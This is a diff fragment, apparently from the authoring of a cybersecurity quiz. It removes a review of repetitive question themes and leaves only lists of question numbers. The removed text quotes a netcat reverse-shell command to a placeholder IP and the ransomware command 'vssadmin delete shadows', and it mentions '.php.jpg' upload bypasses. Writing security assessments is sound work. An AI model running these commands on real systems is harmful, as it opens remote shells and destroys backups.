@@ -1,19 +1,7 @@
-Questions #3, #12, #21, #35, #49, #70, #75, #89, #95 all revolve around detecting base64-encoded DNS traffic, suspicious subdomains, or no matching HTTP traffic—clearly describing DNS tunneling.
-While each is worded slightly differently, they’re very similar in technique.
-
-Reverse Shell / Netcat
-Multiple questions mention nc -nv <ip> 4444 -e /bin/bash or an equivalent command:
-
-#9, #17, #28, #37, #45, #57, #72, #83, etc. Again, each scenario is slightly different but repeats the same reverse-shell concept.
-Unrestricted File Upload
-Several questions mention uploading a malicious file disguised as .php.jpg to get remote code execution:
-
-#14, #24, #47, #52, #76, #94, etc.
-Ransomware Deleting Shadow Copies
-A few questions revolve around vssadmin delete shadows, or encryption + backup removal:
-
-#18, #40, #58, #80, #84, #92.
-Though these are not word-for-word duplicates, the repeated references to these common tactics (DNS tunneling, Netcat shells, malicious .php.jpg file uploads, and ransomware’s vssadmin usage) might feel redundant within a single test. Depending on your objectives, you might want to reduce the repetition or spread these items across multiple tests.
+#12, #21, #35, #49, #75, #89, #95 
+#9, #17, #28, 
+#47, #52, #76, #94
+#58, #80, #84, #92.
 
 
 db.tests.insertOne({
